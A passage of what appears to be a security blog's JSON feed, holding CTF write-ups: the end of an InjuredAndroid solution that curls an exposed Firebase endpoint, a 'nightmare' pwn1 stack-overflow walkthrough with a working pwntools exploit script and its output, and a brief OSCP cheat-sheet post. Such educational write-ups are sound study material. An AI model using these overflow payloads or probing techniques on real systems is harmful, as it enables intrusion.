class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">();</span>        <span class=\"p\">}</span></code></pre></div></div><p>Looking into <code class=\"language-plaintext highlighter-rouge\">FlagNineFirebaseActivity</code> the string <code class=\"language-plaintext highlighter-rouge\">\"ZmxhZ3Mv\"</code> is being decoded and used as the reference directory.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kr\">public</span> <span class=\"nc\">FlagNineFirebaseActivity</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nx\">byte</span><span class=\"p\">[]</span> <span class=\"nx\">decode</span> <span class=\"o\">=</span> <span class=\"nx\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">ZmxhZ3Mv</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">y</span> <span class=\"o\">=</span> <span class=\"nx\">decode</span><span class=\"p\">;</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">decode</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">decodedDirectory</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"nx\">Charset</span> <span class=\"nx\">charset</span> <span class=\"o\">=</span> <span class=\"nx\">StandardCharsets</span><span class=\"p\">.</span><span class=\"nx\">UTF_8</span><span class=\"p\">;</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">charset</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">StandardCharsets.UTF_8</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">z</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">String</span><span class=\"p\">(</span><span class=\"nx\">decode</span><span class=\"p\">,</span> <span class=\"nx\">charset</span><span class=\"p\">);</span>        <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">firebase</span><span class=\"p\">.</span><span class=\"nx\">database</span><span class=\"p\">.</span><span class=\"nx\">f</span> <span class=\"nx\">b2</span> <span class=\"o\">=</span> <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">firebase</span><span class=\"p\">.</span><span class=\"nx\">database</span><span class=\"p\">.</span><span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nf\">b</span><span class=\"p\">();</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">b2</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">FirebaseDatabase.getInstance()</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">firebase</span><span class=\"p\">.</span><span class=\"nx\">database</span><span class=\"p\">.</span><span class=\"nx\">d</span> <span class=\"nx\">d2</span> <span class=\"o\">=</span> <span class=\"nx\">b2</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">();</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">d2</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">FirebaseDatabase.getInstance().reference</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">A</span> <span class=\"o\">=</span> <span class=\"nx\">d2</span><span class=\"p\">;</span>        <span class=\"nx\">com</span><span class=\"p\">.</span><span class=\"nx\">google</span><span class=\"p\">.</span><span class=\"nx\">firebase</span><span class=\"p\">.</span><span class=\"nx\">database</span><span class=\"p\">.</span><span class=\"nx\">d</span> <span class=\"nx\">h</span> <span class=\"o\">=</span> <span class=\"nx\">d2</span><span class=\"p\">.</span><span class=\"nf\">h</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">z</span><span class=\"p\">);</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">h</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">database.child(refDirectory)</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">B</span> <span class=\"o\">=</span> <span class=\"nx\">h</span><span class=\"p\">;</span>    <span class=\"p\">}</span></code></pre></div></div><p>Base64 decode the string and append to the Firebase URL.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">echo</span> <span class=\"dl\">\"</span><span class=\"s2\">ZmxhZ3Mv</span><span class=\"dl\">\"</span> <span class=\"o\">|</span> <span class=\"nx\">base64</span> <span class=\"o\">--</span><span class=\"nx\">decode</span><span class=\"nx\">flags</span><span class=\"o\">/</span><span class=\"nx\">curl</span> <span class=\"nx\">https</span><span class=\"p\">:</span><span class=\"c1\">//injuredandroid.firebaseio.com/flags/.json</span><span class=\"dl\">\"</span><span class=\"s2\">[nine!_flag]</span><span class=\"dl\">\"</span></code></pre></div></div><p>Looking into <code class=\"language-plaintext highlighter-rouge\">submitFlag()</code> we can see that our string is being base64 decoded so we will need to bse64 encode our string and then supply the answer.</p>",
            "url": "http://localhost:4000/injured-android",
            
            
            
            
            
            "date_published": "2023-11-11T00:00:00-05:00",
            "date_modified": "2023-11-11T00:00:00-05:00",
            
                "author":  {
                "name": "ßUG5Y - Writeups",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "http://localhost:4000/overflow-challenge-1",
            "title": "Overflow challenge #1",
            "summary": null,
            "content_text": "This is a short write-up of Challenge #1 a variable overflow from hoppersroppers nightmare repository.First things first lets find out what we are working with.checksec pwn1[*] '/home/user/nightmare/pwn1'    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabledpwn1 is a 32 bit little endian binary with RELRO, a Non-Executable Stack, and PIE. We also can verify that we can run this binary but it exits as it seems to not like our answer to the question asked../pwn1Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.What... is your name?bugsyI don't know that! Auuuuuuuugh!Within Ghidra we can locate an exported function main. main has 3 main parts question 1, 2, and 3./* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx *//* WARNING: Globals starting with '_' overlap smaller symbols at the same address */undefined4 main(undefined param_1){  int iVar1;  char userVar [43];  int local_18;  undefined4 local_14;  undefined1 *local_10;    local_10 = &amp;param_1;  setvbuf(_stdout,(char *)0x2,0,0);  local_14 = 2;  local_18 = 0;  puts(      \"Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\"      );  puts(\"What... is your name?\");  fgets(userVar,0x2b,_stdin);  iVar1 = strcmp(userVar,\"Sir Lancelot of Camelot\\n\");  if (iVar1 != 0) {    puts(\"I don\\'t know that! Auuuuuuuugh!\");                    /* WARNING: Subroutine does not return */    exit(0);  }  puts(\"What... is your quest?\");  fgets(userVar,0x2b,_stdin);  iVar1 = strcmp(userVar,\"To seek the Holy Grail.\\n\");  if (iVar1 != 0) {    puts(\"I don\\'t know that! Auuuuuuuugh!\");                    /* WARNING: Subroutine does not return */    exit(0);  }  puts(\"What... is my secret?\");  gets(userVar);  if (local_18 == -0x215eef38) {    print_flag();  }  else {    puts(\"I don\\'t know that! Auuuuuuuugh!\");  }  return 0;}Question 1: “What… is your name?”This uses fgets() to safely retrieve userVar verify that it is within the bounds of the allocated array. It is then compared it to a hard coded string, \"Sir Lancelot of Camelot\\n\". If it is is equal we continue to the next question.Question 2: “What… is your quest?”Once again using fgets() to retrieve userVar, userVar is then compared to another hard-coded string, \"To seek the Holy Grail.\\n\". If it is equal then we continue to the third question.Question 3: “What… is my secret?”This time gets() is used to retrieve userVar. Meaning that the bounds of the array are not verified and there does not appear to be any other type of safety checks. Additionally userVar is not being compared this time. This time local_18 is compared to -0x215eef38 instead of a hard-coded string and if it is equal then print_flag() is called. However, local_18 is set to equal 0 so in order for the two to be equal we will need to overwrite the value of local_18.Thanks to Ghidra we can view the assembly instructions of the function. This shows us that userVar starts at -0x43 and local_18 starts at -0x18.  Offset=0x43−0x18  Offset=0x2BViewing the assembly for if (local_18 == -0x215eef38) we see that local_18 is being compared to 0xdea110c8.Armed with this knowledge we know we need to overwrite 0x2B (43 bytes) prior to overwriting local_18 with the value that we want it to be, in this case 0xdea110c8.Hacking a Python script together I ended up with the following:from pwn import *p = process('./pwn1')junk = b'A' * 0x2bcomparedVal = 0xdea110c8newLine = b'\\n'payload = [    junk,    p32(comparedVal),    newLine]print(p.recvline())# Question 1print(p.recvline())p.sendline(b'Sir Lancelot of Camelot')# Question 2print(p.recvline())p.sendline(b\"To seek the Holy Grail.\")# Question 3print(p.recvline())print(\"Sending payload....\")p.send(b''.join(payload))print(p.recvline())print(p.recvline())And we got the flag!python3 ./pwn1.py[+] Starting local process '/home/user/nightmare/pwn1': pid 7811b'Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\\n'b'What... is your name?\\n'b'What... is your quest?\\n'b'What... is my secret?\\n'Sending payload....[*] Process '/home/user/nightmare/pwn1' stopped with exit code 0 (pid 7811)b'Right. Off you go.\\n'b'flag{g0ttem_b0yz}\\n'",
            "content_html": "<p>This is a short write-up of Challenge #1 a variable overflow from <a href=\"https://github.com/hoppersroppers/nightmare/tree/master/modules/04-Overflows\">hoppersroppers nightmare repository</a>.</p><p>First things first lets find out what we are working with.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nx\">checksec</span> <span class=\"nx\">pwn1</span><span class=\"p\">[</span><span class=\"o\">*</span><span class=\"p\">]</span> <span class=\"dl\">'</span><span class=\"s1\">/home/user/nightmare/pwn1</span><span class=\"dl\">'</span>    <span class=\"nx\">Arch</span><span class=\"p\">:</span>     <span class=\"nx\">i386</span><span class=\"o\">-</span><span class=\"mi\">32</span><span class=\"o\">-</span><span class=\"nx\">little</span>    <span class=\"nx\">RELRO</span><span class=\"p\">:</span>    <span class=\"nx\">Full</span> <span class=\"nx\">RELRO</span>    <span class=\"nx\">Stack</span><span class=\"p\">:</span>    <span class=\"nx\">No</span> <span class=\"nx\">canary</span> <span class=\"nx\">found</span>    <span class=\"nx\">NX</span><span class=\"p\">:</span>       <span class=\"nx\">NX</span> <span class=\"nx\">enabled</span>    <span class=\"nx\">PIE</span><span class=\"p\">:</span>      <span class=\"nx\">PIE</span> <span class=\"nx\">enabled</span></code></pre></div></div><p>pwn1 is a <code class=\"language-plaintext highlighter-rouge\">32</code> bit little endian binary with RELRO, a Non-Executable Stack, and PIE. We also can verify that we can run this binary but it exits as it seems to not like our answer to the question asked.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">.</span><span class=\"o\">/</span><span class=\"nx\">pwn1</span><span class=\"nx\">Stop</span><span class=\"o\">!</span> <span class=\"nx\">Who</span> <span class=\"nx\">would</span> <span class=\"nx\">cross</span> <span class=\"nx\">the</span> <span class=\"nx\">Bridge</span> <span class=\"k\">of</span> <span class=\"nx\">Death</span> <span class=\"nx\">must</span> <span class=\"nx\">answer</span> <span class=\"nx\">me</span> <span class=\"nx\">these</span> <span class=\"nx\">questions</span> <span class=\"nx\">three</span><span class=\"p\">,</span> <span class=\"nx\">ere</span> <span class=\"nx\">the</span> <span class=\"nx\">other</span> <span class=\"nx\">side</span> <span class=\"nx\">he</span> <span class=\"nx\">see</span><span class=\"p\">.</span><span class=\"nx\">What</span><span class=\"p\">...</span> <span class=\"nx\">is</span> <span class=\"nx\">your</span> <span class=\"nx\">name</span><span class=\"p\">?</span><span class=\"nx\">bugsy</span><span class=\"nx\">I</span> <span class=\"nx\">don</span><span class=\"dl\">'</span><span class=\"s1\">t know that! Auuuuuuuugh!</span></code></pre></div></div><p>Within Ghidra we can locate an exported function <code class=\"language-plaintext highlighter-rouge\">main</code>. <code class=\"language-plaintext highlighter-rouge\">main</code> has 3 main parts question 1, 2, and 3.</p><div class=\"language-c highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"cm\">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span><span class=\"cm\">/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */</span><span class=\"n\">undefined4</span> <span class=\"nf\">main</span><span class=\"p\">(</span><span class=\"n\">undefined</span> <span class=\"n\">param_1</span><span class=\"p\">)</span><span class=\"p\">{</span>  <span class=\"kt\">int</span> <span class=\"n\">iVar1</span><span class=\"p\">;</span>  <span class=\"kt\">char</span> <span class=\"n\">userVar</span> <span class=\"p\">[</span><span class=\"mi\">43</span><span class=\"p\">];</span>  <span class=\"kt\">int</span> <span class=\"n\">local_18</span><span class=\"p\">;</span>  <span class=\"n\">undefined4</span> <span class=\"n\">local_14</span><span class=\"p\">;</span>  <span class=\"n\">undefined1</span> <span class=\"o\">*</span><span class=\"n\">local_10</span><span class=\"p\">;</span>    <span class=\"n\">local_10</span> <span class=\"o\">=</span> <span class=\"o\">&amp;</span><span class=\"n\">param_1</span><span class=\"p\">;</span>  <span class=\"n\">setvbuf</span><span class=\"p\">(</span><span class=\"n\">_stdout</span><span class=\"p\">,(</span><span class=\"kt\">char</span> <span class=\"o\">*</span><span class=\"p\">)</span><span class=\"mh\">0x2</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">);</span>  <span class=\"n\">local_14</span> <span class=\"o\">=</span> <span class=\"mi\">2</span><span class=\"p\">;</span>  <span class=\"n\">local_18</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>  <span class=\"n\">puts</span><span class=\"p\">(</span>      <span class=\"s\">\"Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\"</span>      <span class=\"p\">);</span>  <span class=\"n\">puts</span><span class=\"p\">(</span><span class=\"s\">\"What... is your name?\"</span><span class=\"p\">);</span>  <span class=\"n\">fgets</span><span class=\"p\">(</span><span class=\"n\">userVar</span><span class=\"p\">,</span><span class=\"mh\">0x2b</span><span class=\"p\">,</span><span class=\"n\">_stdin</span><span class=\"p\">);</span>  <span class=\"n\">iVar1</span> <span class=\"o\">=</span> <span class=\"n\">strcmp</span><span class=\"p\">(</span><span class=\"n\">userVar</span><span class=\"p\">,</span><span class=\"s\">\"Sir Lancelot of Camelot</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">iVar1</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"n\">puts</span><span class=\"p\">(</span><span class=\"s\">\"I don</span><span class=\"se\">\\'</span><span class=\"s\">t know that! Auuuuuuuugh!\"</span><span class=\"p\">);</span>                    <span class=\"cm\">/* WARNING: Subroutine does not return */</span>    <span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>  <span class=\"p\">}</span>  <span class=\"n\">puts</span><span class=\"p\">(</span><span class=\"s\">\"What... is your quest?\"</span><span class=\"p\">);</span>  <span class=\"n\">fgets</span><span class=\"p\">(</span><span class=\"n\">userVar</span><span class=\"p\">,</span><span class=\"mh\">0x2b</span><span class=\"p\">,</span><span class=\"n\">_stdin</span><span class=\"p\">);</span>  <span class=\"n\">iVar1</span> <span class=\"o\">=</span> <span class=\"n\">strcmp</span><span class=\"p\">(</span><span class=\"n\">userVar</span><span class=\"p\">,</span><span class=\"s\">\"To seek the Holy Grail.</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">iVar1</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"n\">puts</span><span class=\"p\">(</span><span class=\"s\">\"I don</span><span class=\"se\">\\'</span><span class=\"s\">t know that! Auuuuuuuugh!\"</span><span class=\"p\">);</span>                    <span class=\"cm\">/* WARNING: Subroutine does not return */</span>    <span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>  <span class=\"p\">}</span>  <span class=\"n\">puts</span><span class=\"p\">(</span><span class=\"s\">\"What... is my secret?\"</span><span class=\"p\">);</span>  <span class=\"n\">gets</span><span class=\"p\">(</span><span class=\"n\">userVar</span><span class=\"p\">);</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">local_18</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"mh\">0x215eef38</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"n\">print_flag</span><span class=\"p\">();</span>  <span class=\"p\">}</span>  <span class=\"k\">else</span> <span class=\"p\">{</span>    <span class=\"n\">puts</span><span class=\"p\">(</span><span class=\"s\">\"I don</span><span class=\"se\">\\'</span><span class=\"s\">t know that! Auuuuuuuugh!\"</span><span class=\"p\">);</span>  <span class=\"p\">}</span>  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"p\">}</span></code></pre></div></div><p>Question 1: “What… is your name?”</p><p>This uses <code class=\"language-plaintext highlighter-rouge\">fgets()</code> to safely retrieve <code class=\"language-plaintext highlighter-rouge\">userVar</code> verify that it is within the bounds of the allocated array. It is then compared it to a hard coded string, <code class=\"language-plaintext highlighter-rouge\">\"Sir Lancelot of Camelot\\n\"</code>. If it is is equal we continue to the next question.</p><p>Question 2: “What… is your quest?”</p><p>Once again using <code class=\"language-plaintext highlighter-rouge\">fgets()</code> to retrieve <code class=\"language-plaintext highlighter-rouge\">userVar</code>, <code class=\"language-plaintext highlighter-rouge\">userVar</code> is then compared to another hard-coded string, <code class=\"language-plaintext highlighter-rouge\">\"To seek the Holy Grail.\\n\"</code>. If it is equal then we continue to the third question.</p><p>Question 3: “What… is my secret?”</p><p>This time <code class=\"language-plaintext highlighter-rouge\">gets()</code> is used to retrieve <code class=\"language-plaintext highlighter-rouge\">userVar</code>. Meaning that the bounds of the array are not verified and there does not appear to be any other type of safety checks. Additionally <code class=\"language-plaintext highlighter-rouge\">userVar</code> is not being compared this time. This time <code class=\"language-plaintext highlighter-rouge\">local_18</code> is compared to <code class=\"language-plaintext highlighter-rouge\">-0x215eef38</code> instead of a hard-coded string and if it is equal then <code class=\"language-plaintext highlighter-rouge\">print_flag()</code> is called. However, <code class=\"language-plaintext highlighter-rouge\">local_18</code> is set to equal 0 so in order for the two to be equal we will need to overwrite the value of <code class=\"language-plaintext highlighter-rouge\">local_18</code>.</p><p>Thanks to Ghidra we can view the assembly instructions of the function. This shows us that <code class=\"language-plaintext highlighter-rouge\">userVar</code> starts at <code class=\"language-plaintext highlighter-rouge\">-0x43</code> and <code class=\"language-plaintext highlighter-rouge\">local_18</code> starts at <code class=\"language-plaintext highlighter-rouge\">-0x18</code>.</p><ol>  <li>Offset=0x43−0x18</li>  <li>Offset=0x2B</li></ol><p><img src=\"assets/images/pwn1.png\" alt=\"pwn1.png\" /></p><p>Viewing the assembly for <code class=\"language-plaintext highlighter-rouge\">if (local_18 == -0x215eef38)</code> we see that local_18 is being compared to <code class=\"language-plaintext highlighter-rouge\">0xdea110c8</code>.</p><p><img src=\"assets/images/pwn2.png\" alt=\"pwn2.png\" /></p><p>Armed with this knowledge we know we need to overwrite <code class=\"language-plaintext highlighter-rouge\">0x2B</code> (43 bytes) prior to overwriting local_18 with the value that we want it to be, in this case <code class=\"language-plaintext highlighter-rouge\">0xdea110c8</code>.</p><p>Hacking a Python script together I ended up with the following:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">from</span> <span class=\"n\">pwn</span> <span class=\"kn\">import</span> <span class=\"o\">*</span><span class=\"n\">p</span> <span class=\"o\">=</span> <span class=\"nf\">process</span><span class=\"p\">(</span><span class=\"sh\">'</span><span class=\"s\">./pwn1</span><span class=\"sh\">'</span><span class=\"p\">)</span><span class=\"n\">junk</span> <span class=\"o\">=</span> <span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">A</span><span class=\"sh\">'</span> <span class=\"o\">*</span> <span class=\"mh\">0x2b</span><span class=\"n\">comparedVal</span> <span class=\"o\">=</span> <span class=\"mh\">0xdea110c8</span><span class=\"n\">newLine</span> <span class=\"o\">=</span> <span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"se\">\\n</span><span class=\"sh\">'</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"p\">[</span>    <span class=\"n\">junk</span><span class=\"p\">,</span>    <span class=\"nf\">p32</span><span class=\"p\">(</span><span class=\"n\">comparedVal</span><span class=\"p\">),</span>    <span class=\"n\">newLine</span><span class=\"p\">]</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">recvline</span><span class=\"p\">())</span><span class=\"c1\"># Question 1</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">recvline</span><span class=\"p\">())</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">sendline</span><span class=\"p\">(</span><span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">Sir Lancelot of Camelot</span><span class=\"sh\">'</span><span class=\"p\">)</span><span class=\"c1\"># Question 2</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">recvline</span><span class=\"p\">())</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">sendline</span><span class=\"p\">(</span><span class=\"sa\">b</span><span class=\"sh\">\"</span><span class=\"s\">To seek the Holy Grail.</span><span class=\"sh\">\"</span><span class=\"p\">)</span><span class=\"c1\"># Question 3</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">recvline</span><span class=\"p\">())</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Sending payload....</span><span class=\"sh\">\"</span><span class=\"p\">)</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">send</span><span class=\"p\">(</span><span class=\"sa\">b</span><span class=\"sh\">''</span><span class=\"p\">.</span><span class=\"nf\">join</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">))</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">recvline</span><span class=\"p\">())</span><span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"p\">.</span><span class=\"nf\">recvline</span><span class=\"p\">())</span></code></pre></div></div><p>And we got the flag!</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">python3</span> <span class=\"p\">.</span><span class=\"o\">/</span><span class=\"n\">pwn1</span><span class=\"p\">.</span><span class=\"n\">py</span><span class=\"p\">[</span><span class=\"o\">+</span><span class=\"p\">]</span> <span class=\"n\">Starting</span> <span class=\"n\">local</span> <span class=\"n\">process</span> <span class=\"sh\">'</span><span class=\"s\">/home/user/nightmare/pwn1</span><span class=\"sh\">'</span><span class=\"p\">:</span> <span class=\"n\">pid</span> <span class=\"mi\">7811</span><span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.</span><span class=\"se\">\\n</span><span class=\"sh\">'</span><span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">What... is your name?</span><span class=\"se\">\\n</span><span class=\"sh\">'</span><span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">What... is your quest?</span><span class=\"se\">\\n</span><span class=\"sh\">'</span><span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">What... is my secret?</span><span class=\"se\">\\n</span><span class=\"sh\">'</span><span class=\"n\">Sending</span> <span class=\"n\">payload</span><span class=\"p\">.</span><span class=\"bp\">...</span><span class=\"p\">[</span><span class=\"o\">*</span><span class=\"p\">]</span> <span class=\"n\">Process</span> <span class=\"sh\">'</span><span class=\"s\">/home/user/nightmare/pwn1</span><span class=\"sh\">'</span> <span class=\"n\">stopped</span> <span class=\"k\">with</span> <span class=\"nb\">exit</span> <span class=\"n\">code</span> <span class=\"mi\">0</span> <span class=\"p\">(</span><span class=\"n\">pid</span> <span class=\"mi\">7811</span><span class=\"p\">)</span><span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">Right. Off you go.</span><span class=\"se\">\\n</span><span class=\"sh\">'</span><span class=\"sa\">b</span><span class=\"sh\">'</span><span class=\"s\">flag{g0ttem_b0yz}</span><span class=\"se\">\\n</span><span class=\"sh\">'</span></code></pre></div></div>",
            "url": "http://localhost:4000/overflow-challenge-1",
            
            
            
            
            
            "date_published": "2023-10-11T00:00:00-05:00",
            "date_modified": "2023-10-11T00:00:00-05:00",
            
                "author":  {
                "name": "ßUG5Y - Writeups",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "http://localhost:4000/oscp-cheat-sheet",
            "title": "Oscp cheat Sheet",
            "summary": null,
            "content_text": "While pursuing the OSCP 2023 version, I created a reference sheet that I nicknamed the ‘OSCP Codex.’ This reference sheet encompasses the commands and tricks I utilized during both the OSCP exam and the Proving Ground labs. I hope you find it helpful!Due to the numerous pages, I’m unable to upload them here. However, you can access the OSCP Codex on the Gitbook site using the following link: OSCP Codex",
            "content_html": "<p>While pursuing the OSCP 2023 version, I created a reference sheet that I nicknamed the ‘OSCP Codex.’ This reference sheet encompasses the commands and tricks I utilized during both the OSCP exam and the Proving Ground labs. I hope you find it helpful!</p><p>Due to the numerous pages, I’m unable to upload them here. However, you can access the OSCP Codex on the Gitbook site using the following link: <a href=\"https://oscp-codex.gitbook.io/oscp-codex/\">OSCP Codex</a></p>",
            "url": "http://localhost:4000/oscp-cheat-sheet",
            
            
            
            
            
            "date_published": "2023-09-11T00:00:00-05:00",
            "date_modified": "2023-09-11T00:00:00-05:00",
            
                "author":  {
                "name": "ßUG5Y - Writeups",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}